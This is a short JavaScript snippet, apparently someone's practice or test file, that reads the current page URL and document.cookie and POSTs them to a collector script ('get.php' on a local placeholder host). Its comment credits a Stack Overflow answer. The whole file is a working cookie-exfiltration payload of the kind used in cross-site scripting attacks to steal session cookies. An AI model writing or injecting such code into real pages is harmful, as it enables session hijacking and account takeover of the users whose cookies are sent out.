var http = new XMLHttpRequest();
var url = '127.0.0.1/get.php';
var params = "site="+window.location.href+"&cookie="+document.cookie;
http.open('POST', url, true);

//Send the proper header information along with the request
http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');

http.onreadystatechange = function() {//Call a function when the state changes.
    if(http.readyState == 4 && http.status == 200) {
        alert(http.responseText);
    }
}
http.send(params);

console.log("done");

// REFERENSI = https://stackoverflow.com/questions/9713058/send-post-data-using-xmlhttprequest